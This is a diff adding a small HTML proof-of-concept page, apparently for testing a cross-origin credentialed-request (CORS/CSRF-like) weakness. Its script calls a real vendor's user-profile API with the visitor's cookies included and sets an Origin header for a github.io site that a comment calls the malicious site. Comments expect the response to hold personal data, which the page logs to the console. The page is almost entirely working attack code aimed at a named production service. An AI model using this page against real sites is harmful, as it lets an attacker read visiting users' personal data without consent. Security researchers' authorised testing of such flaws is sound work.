@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Origin Request with Cookies</title>
+    <script>
+        function makeRequest() {
+            fetch('https://ovp.lenovo.com/dxp/api/sacs/v1/user/profile', {
+                method: 'GET',
+                headers: {
+                    'Origin': 'https://nayssers.github.io',  // Your malicious site or target domain
+                    'Accept': 'application/json',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'cross-site',
+                    'Sec-Fetch-Dest': 'empty',
+                },
+                credentials: 'include'  // This is required to include cookies in cross-origin requests
+            })
+            .then(response => {
+                if (response.status === 200) {
+                    response.json().then(data => {
+                        console.log('Response Data:', data); // Log response data (likely PII)
+                    });
+                } else {
+                    console.error('Request failed or unauthorized');
+                }
+            })
+            .catch(error => {
+                console.error('Error making request:', error); // Catch any errors
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Testing CSRF-like Request</h1>
+    <button onclick="makeRequest()">Send Cross-Origin Request with Cookies</button>
+</body>
+</html>
